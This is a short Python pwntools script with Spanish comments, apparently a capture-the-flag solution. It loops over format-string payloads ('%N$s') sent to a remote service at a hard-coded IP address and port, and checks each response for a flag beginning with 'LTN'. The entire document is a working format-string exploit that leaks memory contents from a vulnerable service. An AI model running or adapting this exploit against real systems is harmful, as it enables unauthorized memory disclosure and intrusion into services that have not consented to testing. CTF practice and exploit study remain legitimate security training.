from pwn import *

r = remote("208.68.39.19", 4423)

#loopeando 100 intentos
for i in range(1,100):
    try:
        r = remote("208.68.39.19", 4423)
        payload ="%"+str(i)+"$s" #format string, debe haber una forma mas inteligente de hacer esto que con este loop
        r.sendlineafter("> ",payload)
        result = r.recv(2048)

        if "LTN" in result: #buscando LTN en el response para leer la flag
            print result
            break
        r.close()
    except:
        print "no no no"
        r.close()